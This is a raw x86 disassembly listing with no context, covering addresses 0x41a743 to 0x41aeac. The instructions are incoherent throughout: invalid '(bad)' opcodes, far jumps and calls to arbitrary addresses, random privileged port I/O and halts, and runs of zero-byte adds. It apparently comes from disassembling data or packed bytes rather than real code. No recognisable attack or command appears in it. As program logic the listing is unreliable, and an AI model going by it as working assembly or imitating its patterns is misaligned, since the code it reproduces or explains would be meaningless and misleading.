  41a743:	jbe    0x41a717
  41a745:	add    esp,edi
  41a747:	rol    DWORD PTR [eax],0x0
  41a74a:	add    BYTE PTR [eax],al
  41a74c:	add    BYTE PTR [edx+0x2],dh
  41a74f:	cmp    al,0x89
  41a751:	into   
  41a752:	cmp    DWORD PTR [edx+0x34],0xc3670aff
  41a759:	pop    edx
  41a75a:	mov    ch,BYTE PTR [ebx]
  41a75c:	hlt    
  41a75d:	in     al,dx
  41a75e:	dec    edx
  41a75f:	jmp    0xe5848770
  41a764:	push   esp
  41a765:	jmp    0xbff3:0x3f8bee68
  41a76c:	hlt    
  41a76d:	mov    ecx,DWORD PTR [eax-0x788f95e1]
  41a773:	retf   
  41a774:	shr    DWORD PTR [eax-0x15],cl
  41a777:	outs   dx,BYTE PTR ds:[esi]
  41a778:	inc    edi
  41a779:	mov    DWORD PTR [bp+di-0x5f5],esp
  41a77e:	add    BYTE PTR ds:[edx],bh
  41a781:	jmp    0xe7c2:0x8599f03f
  41a788:	pop    ebp
  41a789:	xchg   edi,eax
  41a78a:	cmc    
  41a78b:	cld    
  41a78c:	cmp    DWORD PTR gs:[esi],eax
  41a78f:	test   BYTE PTR [esi],cl
  41a791:	jno    0x41a795
  41a793:	add    BYTE PTR [edx+edi*4-0x2e],bl
  41a797:	push   eax
  41a798:	mov    ebx,0x1427c4d
  41a79d:	cmp    BYTE PTR [eax-0x10],al
  41a7a0:	fnstenv [esi+0x2]
  41a7a3:	add    BYTE PTR [edx-0x46],ah
  41a7a6:	cli    
  41a7a7:	mov    ecx,ebp
  41a7a9:	cld    
  41a7aa:	mov    esp,0xfe7ad1bf
  41a7af:	outs   dx,BYTE PTR ds:[esi]
  41a7b0:	imul   eax,DWORD PTR [eax],0x0
  41a7b6:	pop    ss
  41a7b7:	push   es
  41a7b8:	mov    BYTE PTR [eax+esi*8],ah
  41a7bb:	je     0x41a77c
  41a7bd:	dec    eax
  41a7be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7bf:	ret    0x3c7f
  41a7c2:	loopne 0x41a83e
  41a7c4:	jbe    0x41a79f
  41a7c6:	idiv   BYTE PTR [edi]
  41a7c8:	std    
  41a7c9:	ja     0x41a74c
  41a7cb:	lods   al,BYTE PTR ds:[esi]
  41a7cc:	mov    esi,0x5d085c80
  41a7d1:	xchg   esi,eax
  41a7d2:	rol    DWORD PTR [edi-0x539626bf],0xd0
  41a7d9:	(bad)  
  41a7da:	mov    ch,0x7c
  41a7dc:	or     edi,DWORD PTR [ebx-0x1102b004]
  41a7e2:	call   0xeeeca5b0
  41a7e7:	adc    BYTE PTR [edi],ch
  41a7e9:	gs mov dh,0x70
  41a7ec:	or     dh,dh
  41a7ee:	ror    cl,0x87
  41a7f1:	in     eax,0x47
  41a7f3:	hlt    
  41a7f4:	rcl    BYTE PTR [esi+0x33],0xfa
  41a7f8:	cld    
  41a7f9:	pushf  
  41a7fa:	data16 jno 0x41a7a9
  41a7fd:	add    BYTE PTR [ebx-0x52],ah
  41a800:	mov    edi,0x2e3058c6
  41a805:	mov    ecx,DWORD PTR [ecx]
  41a807:	or     BYTE PTR [edx+0x6],ch
  41a80a:	dec    edi
  41a80b:	rcr    BYTE PTR [ebx-0x9],cl
  41a80e:	imul   esi,ebp,0xffffffbf
  41a811:	rsm    
  41a813:	retf   0xcdff
  41a816:	leave  
  41a817:	shl    DWORD PTR [ecx+0xb],1
  41a81a:	add    BYTE PTR [eax],al
  41a81c:	add    BYTE PTR [eax],al
  41a81e:	add    BYTE PTR [ebx+0x0],bl
  41a821:	jb     0x41a898
  41a823:	sbb    al,0x0
  41a825:	add    bl,0xe
  41a828:	jmp    0x41a878
  41a82a:	mov    ecx,ecx
  41a82c:	pop    es
  41a82d:	push   0x5
  41a82f:	iret   
  41a830:	rcr    DWORD PTR [ebx-0x9],1
  41a833:	sub    eax,DWORD PTR [edx-0x3efb8a32]
  41a839:	std    
  41a83a:	popa   
  41a83b:	mov    ch,0x74
  41a83d:	add    bl,ch
  41a83f:	test   DWORD PTR [ebx-0x3fbf7bf],eax
  41a845:	jo     0x41a852
  41a847:	sbb    edi,esi
  41a849:	outs   dx,BYTE PTR fs:[esi]
  41a84b:	sub    ah,BYTE PTR [edi-0x80]
  41a84e:	ret    
  41a84f:	fsub   st,st(4)
  41a851:	es push 0xffffffdf
  41a854:	sub    al,0xd2
  41a856:	pop    edi
  41a857:	jmp    0x41a848
  41a859:	adc    edx,0x1c30659
  41a85f:	mov    bl,0x6d
  41a861:	arpl   WORD PTR [eax],ax
  41a863:	pop    es
  41a864:	adc    esi,esi
  41a866:	inc    ebp
  41a867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a868:	(bad)  
  41a869:	jo     0x41a873
  41a86b:	retf   
  41a86c:	std    
  41a86d:	ins    DWORD PTR es:[edi],dx
  41a86e:	gs mov bh,bh
  41a871:	out    0x6,al
  41a873:	pop    ebx
  41a874:	std    
  41a875:	pop    esi
  41a876:	outs   dx,DWORD PTR ds:[esi]
  41a877:	mov    cl,0xff
  41a879:	jg     0x41a83e
  41a87b:	jne    0x41a865
  41a87d:	or     DWORD PTR [esi+0x30001b36],esi
  41a883:	add    BYTE PTR [eax],al
  41a885:	add    BYTE PTR [eax],al
  41a887:	add    BYTE PTR [ebp+0x6f],dh
  41a88a:	lds    ebx,FWORD PTR [eax-0x3e]
  41a88d:	xor    al,dh
  41a88f:	add    esi,DWORD PTR [ebp-0x6a]
  41a892:	(bad)  
  41a893:	jmp    0x41a88b
  41a895:	xor    al,0x54
  41a897:	push   esi
  41a898:	mov    ds:0xa5e83f6e,al
  41a89d:	adc    DWORD PTR [edx+0x34],ecx
  41a8a0:	je     0x41a88b
  41a8a2:	jl     0x41a863
  41a8a4:	test   eax,0x72d8b8e0
  41a8a9:	jmp    0x9e9e0eae
  41a8ae:	call   0x3fa01823
  41a8b3:	call   0xc0518d5d
  41a8b8:	sub    DWORD PTR [si],eax
  41a8bb:	call   0x45fe6a
  41a8c0:	test   BYTE PTR [ebp-0x4],0xff
  41a8c4:	std    
  41a8c5:	sbb    eax,0xe5c9bcf8
  41a8ca:	add    BYTE PTR [eax],al
  41a8cc:	div    BYTE PTR ds:0x3642000c
  41a8d2:	or     al,0xfd
  41a8d4:	push   0x7540163d
  41a8d9:	nop
  41a8da:	adc    ch,bh
  41a8dc:	dec    eax
  41a8dd:	icebp  
  41a8de:	stc    
  41a8df:	adc    bl,BYTE PTR [ecx-0x8]
  41a8e2:	inc    eax
  41a8e3:	add    BYTE PTR [eax-0x19],dh
  41a8e6:	add    eax,DWORD PTR [eax]
  41a8e8:	jne    0x41a8e0
  41a8ea:	mov    DWORD PTR ss:[eax],eax
  41a8ed:	add    BYTE PTR [eax],al
  41a8ef:	add    BYTE PTR [eax],al
  41a8f1:	cmp    BYTE PTR [ebp+0x36],dh
  41a8f4:	rcr    ah,cl
  41a8f6:	add    BYTE PTR ds:0xf46c7500,0x8a
  41a8fd:	xor    BYTE PTR [edx],al
  41a8ff:	dec    edi
  41a900:	mov    BYTE PTR [edi],al
  41a902:	mov    dl,0xb8
  41a904:	jmp    0x41a91e
  41a906:	hlt    
  41a907:	push   ebp
  41a908:	cli    
  41a909:	jno    0x41a953
  41a90b:	dec    ebx
  41a90c:	jg     0x41a938
  41a90e:	ja     0x41a8f6
  41a910:	mov    es,edi
  41a912:	(bad)  
  41a913:	jno    0x41a8de
  41a915:	push   edx
  41a916:	out    0x5f,al
  41a918:	cli    
  41a919:	push   ecx
  41a91a:	xchg   BYTE PTR [esi],bh
  41a91c:	add    eax,ecx
  41a91e:	or     ch,BYTE PTR [edi+0x1dfec94b]
  41a924:	inc    eax
  41a925:	cmp    eax,0x1afb9384
  41a92a:	push   es
  41a92b:	out    0x3,eax
  41a92d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a92e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a92f:	mov    eax,0x3050c1c3
  41a934:	lds    esi,FWORD PTR [edx+0x2]
  41a937:	aaa    
  41a938:	add    al,0x1c
  41a93a:	stc    
  41a93b:	xchg   ebx,eax
  41a93c:	mov    ds,WORD PTR [esi]
  41a93e:	xchg   dl,dl
  41a940:	adc    al,0xa4
  41a942:	pop    eax
  41a943:	jb     0x41a974
  41a945:	pop    ebp
  41a946:	adc    ah,BYTE PTR [edi]
  41a948:	add    al,0xa4
  41a94a:	int    0x39
  41a94c:	xchg   DWORD PTR [edi],esi
  41a94e:	jmp    0x551a:0x64f5516
  41a955:	add    BYTE PTR [eax],al
  41a957:	add    BYTE PTR [eax],al
  41a959:	add    BYTE PTR [ecx+esi*8+0x3b],al
  41a95d:	or     al,0xfd
  41a95f:	dec    edi
  41a960:	scas   al,BYTE PTR es:[edi]
  41a961:	ins    BYTE PTR es:[edi],dx
  41a962:	retf   0xe6f1
  41a965:	add    ecx,0xffffffd8
  41a968:	arpl   sp,ax
  41a96a:	inc    edi
  41a96b:	push   ebp
  41a96c:	lea    ebp,ds:[edi+0xe]
  41a970:	test   DWORD PTR [ebx+0x75],0xf0c237b
  41a977:	push   es
  41a978:	jle    0x41a9e9
  41a97a:	imul   ebx,DWORD PTR [eax+eax*1-0x13],0x81580820
  41a982:	cmp    al,0x6e
  41a984:	add    cl,ch
  41a986:	sti    
  41a987:	inc    esp
  41a988:	lock mov ecx,0xb9f444f3
  41a98e:	leave  
  41a98f:	pop    esp
  41a990:	add    DWORD PTR [edx-0x4302ac3f],edi
  41a996:	jp     0x41a987
  41a998:	jb     0x41a9db
  41a99a:	pop    esp
  41a99b:	xlat   BYTE PTR ds:[ebx]
  41a99c:	sub    BYTE PTR [ecx],0xe2
  41a99f:	sti    
  41a9a0:	cld    
  41a9a1:	mov    ah,0x5a
  41a9a3:	out    dx,al
  41a9a4:	aam    0x6a
  41a9a6:	retf   0xfef2
  41a9a9:	xchg   esp,eax
  41a9aa:	imul   ebp,edi,0x6bf9e142
  41a9b0:	or     BYTE PTR [ebp-0x12173c60],al
  41a9b6:	xor    al,0x44
  41a9b8:	std    
  41a9b9:	call   0xf73a1ddb
  41a9be:	add    BYTE PTR [eax],al
  41a9c0:	add    BYTE PTR [eax],al
  41a9c2:	add    BYTE PTR ds:0xda48a4e,ah
  41a9c8:	dec    edi
  41a9c9:	pop    ecx
  41a9ca:	mov    al,0x38
  41a9cc:	or     DWORD PTR [eax],eax
  41a9ce:	xor    al,0xf2
  41a9d0:	pop    esp
  41a9d1:	and    al,0x65
  41a9d3:	neg    esp
  41a9d5:	iret   
  41a9d6:	jmp    0x41aa4e
  41a9d8:	add    dl,BYTE PTR [ecx+0x1f]
  41a9db:	inc    esp
  41a9dc:	xor    eax,eax
  41a9de:	ins    BYTE PTR es:[edi],dx
  41a9df:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9e1:	cli    
  41a9e2:	mov    dh,0xcd
  41a9e4:	aas    
  41a9e5:	push   eax
  41a9e6:	sbb    DWORD PTR [ebx+0x26],ebx
  41a9e9:	push   eax
  41a9ea:	(bad)  [ecx+0x604112ed]
  41a9f0:	inc    edx
  41a9f1:	add    BYTE PTR [esi+esi*4+0x73],ch
  41a9f5:	jno    0x41aa59
  41a9f7:	pop    ebx
  41a9f8:	sahf   
  41a9f9:	adc    BYTE PTR [eax],al
  41a9fb:	dec    esp
  41a9fc:	push   es
  41a9fd:	mov    DWORD PTR [ebp-0x407d0],eax
  41aa03:	ins    BYTE PTR es:[edi],dx
  41aa04:	jmp    0x41a9d8
  41aa06:	mov    ebx,ecx
  41aa08:	or     BYTE PTR ds:0x23dd8c40,cl
  41aa0e:	lea    edx,[ecx]
  41aa10:	xchg   ecx,eax
  41aa11:	stc    
  41aa12:	dec    ebx
  41aa14:	push   ebx
  41aa15:	sti    
  41aa16:	adc    eax,0x4016f4
  41aa1b:	jmp    0x9c3f4b90
  41aa20:	jmp    0x400f:0xb031ff4c
  41aa27:	add    BYTE PTR [eax],al
  41aa29:	add    BYTE PTR [eax],al
  41aa2b:	add    BYTE PTR [ecx+esi*2-0x43],bl
  41aa2f:	je     0x41aa8b
  41aa31:	mov    DWORD PTR [ecx-0x415a65c],eax
  41aa37:	push   eax
  41aa38:	mov    edx,ecx
  41aa3a:	fs leavew 
  41aa3d:	xor    BYTE PTR [eax+edx*2-0x25e8f57],ch
  41aa44:	sbb    edi,eax
  41aa46:	dec    esp
  41aa47:	push   DWORD PTR [ebx+0x70]
  41aa4a:	mov    ebp,0x7f615274
  41aa4f:	jge    0x41aa1d
  41aa51:	imul   esi,DWORD PTR [ecx+0x1b],0x1b
  41aa55:	jb     0x41aad3
  41aa57:	xor    ebx,DWORD PTR [ecx+edx*2]
  41aa5a:	test   DWORD PTR [ebp-0x38],eax
  41aa5d:	jp     0x41aaa0
  41aa5f:	sar    BYTE PTR [edi+esi*8+0x11],0xa4
  41aa64:	ret    0x43
  41aa67:	test   DWORD PTR [edx+esi*2],ebx
  41aa6a:	add    al,0xb3
  41aa6c:	fstp   st(4)
  41aa6e:	push   es
  41aa6f:	push   0xffffffbc
  41aa71:	clc    
  41aa72:	jno    0x41aaf0
  41aa74:	in     al,0x9b
  41aa76:	out    dx,eax
  41aa77:	add    BYTE PTR [ebp-0x27],dh
  41aa7a:	push   ebp
  41aa7b:	pop    esi
  41aa7c:	call   FWORD PTR [eax+ebx*2-0x3412477f]
  41aa83:	shl    DWORD PTR [ecx-0x27],0x4f
  41aa87:	mov    DWORD PTR [ecx+0x741be85a],esp
  41aa8d:	fld    DWORD PTR [eax]
  41aa8f:	push   ecx
  41aa90:	add    BYTE PTR [eax],al
  41aa92:	add    BYTE PTR [eax],al
  41aa94:	add    BYTE PTR [ebx],ch
  41aa96:	mov    al,0x66
  41aa98:	adc    BYTE PTR [edx-0x2a],bh
  41aa9b:	or     BYTE PTR [ecx-0xfb899b4],cl
  41aaa1:	les    eax,FWORD PTR [ecx-0x36]
  41aaa4:	icebp  
  41aaa5:	jne    0x41aa80
  41aaa7:	xor    eax,DWORD PTR [ebx+0x65]
  41aaaa:	(bad)  
  41aaab:	xor    eax,DWORD PTR [ebx+0x49]
  41aaae:	sbb    ch,ah
  41aab0:	psrlq  mm5,mm2
  41aab3:	aas    
  41aab4:	test   BYTE PTR [esi-0x7938ced8],0x19
  41aabb:	mov    dl,BYTE PTR [ebx+0x78]
  41aabe:	in     eax,0x30
  41aac0:	push   esp
  41aac1:	js     0x41aad4
  41aac3:	inc    esp
  41aac4:	sbb    DWORD PTR ds:0x324405dd,0x7df6819a
  41aace:	imul   ebp,edx,0x36
  41aad1:	mov    cl,cl
  41aad3:	ins    BYTE PTR es:[edi],dx
  41aad4:	and    eax,DWORD PTR [edx]
  41aad6:	dec    esi
  41aad7:	adc    al,0x8b
  41aad9:	lock shl dl,1
  41aadc:	cld    
  41aadd:	repnz popa 
  41aadf:	mov    eax,0xf5bfebe7
  41aae4:	out    0x2,eax
  41aae6:	pop    edx
  41aae7:	idiv   ah
  41aae9:	dec    edi
  41aaea:	leave  
  41aaeb:	push   esi
  41aaec:	mov    ecx,DWORD PTR [eax-0x57]
  41aaef:	xchg   DWORD PTR [edx-0x30a6123],eax
  41aaf5:	int    0x1
  41aaf7:	ret    
  41aaf8:	test   BYTE PTR [eax],al
  41aafa:	add    BYTE PTR [eax],al
  41aafc:	add    BYTE PTR [eax],al
  41aafe:	mov    ecx,0x37adedee
  41ab03:	push   ss
  41ab04:	ret    0x26be
  41ab07:	es pop ds
  41ab09:	jo     0x41ab7c
  41ab0b:	cmp    bh,ah
  41ab0d:	adc    eax,0x43f635dd
  41ab12:	jne    0x41ab70
  41ab14:	out    dx,al
  41ab15:	jmp    0x235:0x6f22aa71
  41ab1c:	sar    ebp,1
  41ab1e:	sbb    DWORD PTR [edx+0x72],edx
  41ab21:	mov    esi,0x8c3ef1fd
  41ab26:	inc    ebx
  41ab27:	add    esp,edi
  41ab29:	mov    BYTE PTR [esi+0x69],bh
  41ab2c:	shr    DWORD PTR [ebx],1
  41ab2e:	les    edi,FWORD PTR [edi-0x5d]
  41ab31:	repz ret 0xdbed
  41ab35:	mov    ds:0x56e74260,eax
  41ab3a:	mov    ds:0x6ac13049,eax
  41ab3f:	add    dh,BYTE PTR [ebp-0x624dc76]
  41ab45:	add    esi,DWORD PTR [ebp+0x2]
  41ab48:	adc    eax,0xe7fa593f
  41ab4d:	outs   dx,DWORD PTR ds:[esi]
  41ab4e:	jae    0x41aba4
  41ab50:	paddusw mm4,QWORD PTR [ebx]
  41ab53:	add    esp,edi
  41ab55:	mov    dh,BYTE PTR [eax]
  41ab57:	dec    ebp
  41ab58:	sub    edi,edi
  41ab5a:	add    bh,BYTE PTR [ecx+0x2c]
  41ab5d:	or     al,0x30
  41ab5f:	add    eax,0x6d33
  41ab64:	add    BYTE PTR [eax],al
  41ab66:	add    BYTE PTR ds:0x66c46c02,dh
  41ab6c:	clc    
  41ab6d:	popa   
  41ab6e:	or     al,0x45
  41ab70:	in     eax,dx
  41ab71:	pop    ss
  41ab72:	or     al,0xf4
  41ab74:	fs out dx,eax
  41ab76:	add    edi,esp
  41ab78:	mov    esp,0xa0abfff
  41ab7d:	(bad)  
  41ab7e:	call   0x392d26b6
  41ab83:	cmp    DWORD PTR es:[eax-0xf],0x76
  41ab88:	jbe    0x41ab8e
  41ab8a:	pop    ecx
  41ab8b:	jbe    0x41ab52
  41ab8d:	shr    BYTE PTR [edx+0x42],0xea
  41ab91:	call   FWORD PTR [esi]
  41ab93:	or     DWORD PTR [edx+0x15],eax
  41ab96:	sub    DWORD PTR [ecx+0x5a],edi
  41ab99:	pusha  
  41ab9a:	fidiv  WORD PTR [esi]
  41ab9c:	add    ch,al
  41ab9e:	mov    WORD PTR [ebp-0x13],ds
  41aba1:	cld    
  41aba2:	jb     0x41ab25
  41aba4:	xor    ch,0xd5
  41aba7:	lods   al,BYTE PTR ds:[esi]
  41aba8:	jnp    0x41abaf
  41abaa:	push   0xffffffca
  41abac:	out    dx,al
  41abad:	call   FWORD PTR [ebx-0x46]
  41abb0:	out    dx,al
  41abb1:	dec    esi
  41abb2:	lahf   
  41abb3:	popa   
  41abb4:	cmp    eax,0x7039641c
  41abb9:	and    ah,BYTE PTR [edx-0x76]
  41abbc:	out    dx,al
  41abbd:	sub    BYTE PTR [ecx],0xc5
  41abc0:	or     ecx,DWORD PTR [ecx-0x7b00c0f]
  41abc6:	mov    ebx,0xf54eefc6
  41abcb:	add    BYTE PTR [eax],al
  41abcd:	add    BYTE PTR [eax],al
  41abcf:	add    BYTE PTR [ebx-0xa1a8c53],ch
  41abd5:	pop    edi
  41abd6:	clc    
  41abd7:	jmp    0x733debc9
  41abdc:	adc    DWORD PTR [edx-0x3],0x57b7e98
  41abe3:	xchg   edi,eax
  41abe4:	or     DWORD PTR ds:0xea3b7208,edi
  41abea:	pop    ebp
  41abeb:	fs mov dh,0x70
  41abee:	add    esp,DWORD PTR [eax+0x35]
  41abf1:	cli    
  41abf2:	call   0xc7045069
  41abf7:	add    BYTE PTR [edi],cl
  41abf9:	cmp    al,0x87
  41abfb:	in     al,dx
  41abfc:	ins    DWORD PTR es:[edi],dx
  41abfd:	jnp    0x41ac3b
  41abff:	or     BYTE PTR [edi+0x4c],bl
  41ac02:	cld    
  41ac03:	add    BYTE PTR [edi-0x7],dl
  41ac06:	mov    BYTE PTR [ebp+0x10],dl
  41ac09:	push   ebx
  41ac0a:	push   eax
  41ac0b:	jmp    FWORD PTR [ebp+0x3e]
  41ac0e:	add    eax,0x657f0288
  41ac14:	lock add BYTE PTR [edi-0x40480fbb],al
  41ac1b:	push   esi
  41ac1c:	fs adc eax,DWORD PTR ss:[eax-0x64]
  41ac21:	pop    eax
  41ac22:	push   eax
  41ac23:	pop    ss
  41ac24:	dec    esp
  41ac25:	push   es
  41ac26:	call   0x431c85
  41ac2b:	mov    ecx,esp
  41ac2d:	ins    BYTE PTR es:[edi],dx
  41ac2e:	repz je 0x41ac55
  41ac31:	aas    
  41ac32:	sti    
  41ac33:	je     0x41ac35
  41ac35:	add    BYTE PTR [eax],al
  41ac37:	add    BYTE PTR [eax],al
  41ac39:	js     0x41ac35
  41ac3b:	cli    
  41ac3c:	adc    eax,0x401308
  41ac41:	(bad)  
  41ac42:	out    0x81,eax
  41ac44:	dec    DWORD PTR [eax]
  41ac46:	sbb    eax,0x3deb0687
  41ac4b:	sti    
  41ac4c:	push   eax
  41ac4d:	sub    al,0x6d
  41ac4f:	mov    ebp,0xb3074675
  41ac54:	dec    esp
  41ac55:	cmp    BYTE PTR [eax],dl
  41ac57:	xchg   DWORD PTR [esi],eax
  41ac59:	fnstsw WORD PTR ds:0x6d3450fb
  41ac5f:	mov    ebp,0x70f71675
  41ac64:	and    al,0x28
  41ac66:	jnp    0x41ac6a
  41ac68:	push   esi
  41ac69:	adc    edx,DWORD PTR [ecx+0x30]
  41ac6c:	test   esp,ecx
  41ac6e:	imul   ecx,DWORD PTR [ebx+ecx*4],0x56004dda
  41ac75:	jne    0x41ac4b
  41ac77:	push   ebx
  41ac78:	inc    eax
  41ac79:	clc    
  41ac7a:	cdq    
  41ac7b:	ja     0x41ac85
  41ac7d:	out    dx,al
  41ac7e:	fist   DWORD PTR [esi-0x3]
  41ac81:	and    eax,0x22f635f1
  41ac86:	mov    ah,0x16
  41ac88:	cmp    al,0x66
  41ac8a:	sbb    DWORD PTR [ecx+ecx*4],eax
  41ac8d:	mov    bl,0x44
  41ac8f:	push   edx
  41ac90:	ret    0xd981
  41ac93:	push   edi
  41ac94:	mov    DWORD PTR [ecx+0x6d427d2a],ebx
  41ac9a:	xor    ebx,DWORD PTR [ecx-0x18]
  41ac9d:	add    BYTE PTR [eax],al
  41ac9f:	add    BYTE PTR [eax],al
  41aca1:	add    BYTE PTR [ebx],bh
  41aca3:	test   al,dh
  41aca5:	cld    
  41aca6:	(bad)  
  41aca7:	imul   eax,DWORD PTR [edi-0x7ae4fe0b],0x7dd98162
  41acb1:	add    eax,0x4eecb6e8
  41acb6:	jb     0x41ac8e
  41acb8:	adc    al,0xd
  41acba:	and    ah,BYTE PTR [esi+0x3ccb4f10]
  41acc0:	push   esp
  41acc1:	sub    al,dh
  41acc3:	sbb    BYTE PTR [eax+0x4],bh
  41acc6:	test   ch,0xec
  41acc9:	(bad)  
  41acca:	(bad)  
  41accb:	ficom  DWORD PTR [esi-0x3]
  41acce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41accf:	loope  0x41ad4e
  41acd1:	inc    edx
  41acd2:	cmp    DWORD PTR [eax-0xc],esi
  41acd5:	xor    BYTE PTR ds:0x7d890b95,0x7f
  41acdc:	icebp  
  41acdd:	dec    edi
  41acde:	and    ch,BYTE PTR [edx+0x701d8950]
  41ace4:	or     dl,BYTE PTR [esi+0x12]
  41ace7:	mov    eax,edi
  41ace9:	xor    BYTE PTR ds:0xe90cf15e,dh
  41acef:	sbb    ch,bl
  41acf1:	inc    edi
  41acf2:	cli    
  41acf3:	add    DWORD PTR [eax+ebx*1-0x10],ebx
  41acf7:	je     0x41acf0
  41acf9:	repnz addr16 (bad) 
  41acfc:	mov    esi,0xcdeae029
  41ad01:	jle    0x41ace5
  41ad03:	test   ch,al
  41ad05:	js     0x41ad07
  41ad07:	add    BYTE PTR [eax],al
  41ad09:	add    BYTE PTR [eax],al
  41ad0b:	jns    0x41ad3d
  41ad0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad0e:	ficomp WORD PTR [edx+0x25fc2b77]
  41ad14:	fidiv  DWORD PTR [edi+0x71eab9f1]
  41ad1a:	repz div ebx
  41ad1d:	adc    ecx,DWORD PTR [eax]
  41ad1f:	mov    DWORD PTR [bx+di-0x13e9],0x985a3603
  41ad28:	push   ecx
  41ad29:	(bad)  
  41ad2a:	jle    0x41acd6
  41ad2c:	jbe    0x41ad12
  41ad2e:	pop    ecx
  41ad2f:	mov    BYTE PTR [ecx-0x21],dl
  41ad32:	mov    BYTE PTR [ebp-0x1239ad06],bl
  41ad38:	add    bh,BYTE PTR [esi+0x70fac2f2]
  41ad3e:	(bad)  
  41ad3f:	int    0x49
  41ad41:	mov    ch,0xbc
  41ad43:	xor    al,0x13
  41ad45:	out    0x58,eax
  41ad47:	in     al,dx
  41ad48:	(bad)  
  41ad49:	fild   QWORD PTR [bp-0x2]
  41ad4d:	out    0x3,al
  41ad4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad50:	push   eax
  41ad51:	stc    
  41ad52:	into   
  41ad53:	test   eax,0x673bd3e9
  41ad58:	inc    edx
  41ad59:	out    0x86,eax
  41ad5b:	sub    ch,dl
  41ad5d:	xchg   edx,eax
  41ad5e:	outs   dx,DWORD PTR ds:[esi]
  41ad5f:	fst    QWORD PTR [edx]
  41ad61:	fwait
  41ad62:	cld    
  41ad63:	in     eax,dx
  41ad64:	mov    ecx,0x3c552fe
  41ad69:	out    0xde,eax
  41ad6b:	js     0x41adbe
  41ad6d:	cmovl  eax,DWORD PTR [eax]
  41ad70:	add    BYTE PTR [eax],al
  41ad72:	add    BYTE PTR [eax],al
  41ad74:	loope  0x41ad5f
  41ad76:	push   ebp
  41ad78:	sti    
  41ad79:	test   eax,0xfe9e8472
  41ad7e:	(bad)  
  41ad7f:	call   0x6d1628fa
  41ad84:	push   0xffffffdd
  41ad86:	cli    
  41ad87:	(bad)  
  41ad88:	in     al,0xe1
  41ad8a:	cmp    dl,BYTE PTR [ecx+0x6c8b0271]
  41ad90:	aad    0xec
  41ad92:	cld    
  41ad93:	mov    esi,0xad12e721
  41ad98:	push   0x425c0042
  41ad9d:	out    dx,al
  41ad9e:	mov    bh,0x66
  41ada0:	jns    0x41ada4
  41ada2:	add    BYTE PTR [ecx-0x16ff8f83],dl
  41ada8:	and    eax,DWORD PTR [ebx+eiz*8+0x4fe6a492]
  41adaf:	adc    edi,DWORD PTR [ecx+0x7b]
  41adb2:	lds    ebx,FWORD PTR [ecx]
  41adb4:	or     al,BYTE PTR [ebx+ebp*8+0x4fe68474]
  41adbb:	outs   dx,BYTE PTR ds:[esi]
  41adbc:	bound  edx,QWORD PTR [edx]
  41adbe:	pop    gs
  41adc0:	jbe    0x41ad47
  41adc2:	mov    edi,0xff5c7ad5
  41adc7:	arpl   dx,di
  41adc9:	in     al,0xf8
  41adcb:	dec    esi
  41adcc:	cmp    DWORD PTR fs:[ebp+0x46],edx
  41add0:	push   0xe
  41add2:	pop    gs
  41add4:	jbe    0x41ae53
  41add6:	or     BYTE PTR [ebp+0x0],0x0
  41adda:	add    BYTE PTR [eax],al
  41addc:	add    BYTE PTR [eax-0x1a],dl
  41addf:	cld    
  41ade0:	cdq    
  41ade1:	push   ds
  41ade2:	fst    DWORD PTR [eax+0x72e62426]
  41ade8:	in     eax,dx
  41ade9:	and    eax,0x3ebe0874
  41adee:	(bad)  [ebx-0x18]
  41adf1:	jbe    0x41ae71
  41adf3:	mov    edi,0x37f99100
  41adf8:	inc    ebp
  41adf9:	sub    al,0x70
  41adfb:	add    DWORD PTR [eax+0x1670e707],eax
  41ae01:	hlt    
  41ae02:	adc    al,0x23
  41ae04:	add    ah,bl
  41ae06:	icebp  
  41ae07:	adc    DWORD PTR [esi+ebp*8+0x44],esp
  41ae0b:	add    dh,bh
  41ae0d:	bswap  esp
  41ae0f:	dec    eax
  41ae10:	jmp    FWORD PTR [ebx-0x58fe530f]
  41ae16:	(bad)  
  41ae17:	xor    eax,eax
  41ae19:	push   0x37
  41ae1b:	(bad)
  41ae1e:	add    al,0x51
  41ae20:	mov    edi,eax
  41ae22:	sub    eax,0x18
  41ae25:	popf   
  41ae26:	add    al,0x0
  41ae28:	push   ebx
  41ae29:	bound  ecx,QWORD PTR [ebx-0x5]
  41ae2c:	xor    eax,0x3fd488
  41ae31:	cmp    DWORD PTR [eax-0x10],esi
  41ae34:	call   0x3ed5c4
  41ae39:	adc    ch,al
  41ae3b:	or     eax,DWORD PTR [edx+eiz*1+0x5]
  41ae42:	add    BYTE PTR [eax],al
  41ae44:	add    BYTE PTR [eax],al
  41ae46:	addps  xmm1,XMMWORD PTR [eax]
  41ae49:	add    BYTE PTR [edx+0x4100fb40],ah
  41ae4f:	adc    bh,bl
  41ae51:	jne    0x41aeaf
  41ae53:	addr16 jp 0x41ae62
  41ae56:	stos   DWORD PTR es:[edi],eax
  41ae57:	jo     0x41ae4d
  41ae59:	call   DWORD PTR [ecx]
  41ae5b:	hlt    
  41ae5c:	in     al,0xf6
  41ae5e:	mov    dh,dl
  41ae60:	sti    
  41ae61:	mov    BYTE PTR [ecx],dl
  41ae63:	xrelease mov DWORD PTR [ebp+0x7c],eax
  41ae67:	retf   
  41ae68:	jns    0x41aeb7
  41ae6a:	sbb    eax,0xa76be704
  41ae6f:	pop    eax
  41ae70:	hlt    
  41ae71:	push   edi
  41ae72:	jne    0x41ae84
  41ae74:	jbe    0x41ae66
  41ae76:	or     eax,0x12ffdf97
  41ae7b:	jne    0x41ae6e
  41ae7d:	mov    dh,BYTE PTR [eax-0x4f9d2617]
  41ae83:	fiadd  DWORD PTR [eax]
  41ae85:	add    DWORD PTR [ebx],0x6e
  41ae88:	push   edx
  41ae89:	push   0xd725
  41ae8e:	pop    ebp
  41ae8f:	icebp  
  41ae90:	bound  eax,QWORD PTR [eax+0x75]
  41ae93:	pop    esi
  41ae94:	xchg   edi,esp
  41ae96:	fstp   TBYTE PTR [eax+0x3f10e7ec]
  41ae9c:	in     eax,dx
  41ae9d:	cld    
  41ae9e:	and    eax,0xbb88bd74
  41aea3:	rol    DWORD PTR [esi-0x796745fa],0xbf
  41aeaa:	add    BYTE PTR [eax],al
  41aeac:	add    BYTE PTR [eax],al
